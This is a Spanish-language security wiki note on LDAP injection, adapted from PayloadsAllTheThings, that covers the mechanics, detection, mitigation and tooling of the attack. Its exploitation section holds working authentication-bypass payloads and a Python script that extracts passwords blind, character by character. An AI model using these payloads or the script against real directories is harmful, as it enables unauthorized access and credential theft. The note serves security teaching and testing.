---
tags:
  - seguridad-web
  - owasp
  - ldap
aliases:
  - LDAP Injection
  - Inyección LDAP
---

# Inyección LDAP

**La inyección LDAP** ocurre cuando una aplicación construye filtros de consulta LDAP a partir de entrada del usuario sin sanearla, permitiendo al atacante modificar la lógica del filtro para saltarse autenticaciones o extraer información del directorio.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

Los filtros LDAP usan paréntesis y operadores lógicos (`&` AND, `|` OR, `!` NOT) y el comodín `*`. Al inyectar estos metacaracteres, el atacante reescribe la estructura del filtro original. Es análoga a la SQLi pero sobre la sintaxis de filtros LDAP.

## Detección y pruebas

- Introducir `*`, `)`, `(`, `&`, `|` en campos como usuario/búsqueda y observar errores o cambios de comportamiento.
- Comprobar condiciones siempre verdaderas/falsas para confirmar la inyección.

## Explotación / payloads

### Bypass de autenticación

Inyectar condiciones siempre verdaderas en el filtro:

```sql
user = *)(uid=*))(|(uid=*
pass = password
-- filtro resultante:
(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

```sql
user = admin)(!(&(1=0
pass = q))
-- filtro resultante:
(&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### Explotación a ciegas (blind)

El filtro responde distinto según coincida o no, lo que permite extraer datos por fuerza bruta con `*`:

```sql
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYKE)) : OK
```

Atributos por defecto útiles en inyecciones tipo `*)(ATRIBUTO=*`:

```bash
userPassword  cn  sn  mail  givenName  objectClass  commonName
```

### Script de extracción blind

```python
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
flag = ""
for i in range(50):
    for char in alphabet:
        r = requests.get("http://example.com/?action=dir&search=admin*)(password=" + flag + char)
        if "TRUE CONDITION" in r.text:
            flag += char
            print("[+] Valor:", flag)
            break
```

## Mitigación

- **Escapar** los metacaracteres de filtro LDAP en toda entrada (`*`, `(`, `)`, `\`, `NUL`) según RFC 4515.
- Usar **APIs/bibliotecas de filtro seguras** que parametricen la construcción del filtro en lugar de concatenar cadenas.
- **Validación con allowlist** del formato esperado de cada campo.
- **Mínimo privilegio** en la cuenta de bind y separar el bind de búsqueda del de autenticación.

## Herramientas

- **LDAP Blind Explorer** — explotación a ciegas de inyecciones LDAP.

---
🔗 Relacionado: [[Inyección SQL (SQLi)]] · [[Inyección NoSQL]] · [[Inyección XPath]]
📚 Fuente: [PayloadsAllTheThings — LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection) (MIT, © Swissky)
